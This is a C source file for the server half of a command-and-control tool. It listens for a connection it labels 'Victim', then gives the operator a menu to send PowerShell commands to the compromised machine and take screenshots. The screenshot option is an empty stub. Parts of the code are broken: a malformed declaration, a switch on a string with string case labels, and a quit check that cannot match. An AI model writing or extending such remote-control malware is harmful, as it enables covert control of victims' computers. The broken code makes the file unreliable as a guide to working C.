#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include "c2.h"
#include "server/server_psh.h"

int main() {
    // Client and server socket file descriptors
    sock_t server_fd, client_fd;

    // Socket address structure
    struct sockaddr_in addr = {0};
    socklen_t addr_len = sizeof(addr);

    SOCK_INIT();

    // Create a TCP socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    // Config
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;         
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    // Begin listening and accept one connection
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 

    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);

    // Waiting for client connection
    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));

    // Main loop
    while(1) {
        char buf[C2_BUF_SIZE], char cmd[4];
        printf("[*] Command list, type quit to exit:\n");
        printf("1. Execute powershell command.\n");
        printf("2. Take screenshot.\n");
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        if (strcmp(cmd, "quit") == 0) break;

        switch (cmd) {
            case "1":
                psh_send(buf, client_fd);
                break;
            case "2":
                break;
            default:
                break;
        }
    }

    CLOSE_SOCK(client_fd);  
    CLOSE_SOCK(server_fd);
    SHUT_DOWN();
    return 0; 
}